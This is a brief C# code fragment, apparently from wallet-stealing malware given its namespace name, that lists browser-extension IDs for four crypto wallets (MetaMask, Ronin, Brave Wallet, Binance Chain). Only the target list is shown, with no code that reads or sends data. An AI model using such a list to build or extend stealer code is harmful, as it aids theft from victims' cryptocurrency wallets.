...
namespace youknowcaliber
{
    ...
    public class walletdirs
    {
        public string metamask = "nkbihfbeogaeaoehlefnkodbefgpgknn";
        public string roninwallet = "fnjhmkhhmkbjkkabndcnnogagogbneec";
        public string bravewallet = "odbfpeeihdkbihmopkbjmoonfanlbfcl";
        public string binancechain = "fhbohimaelbohpjbbldcngcnapndodjp";
    } 
}
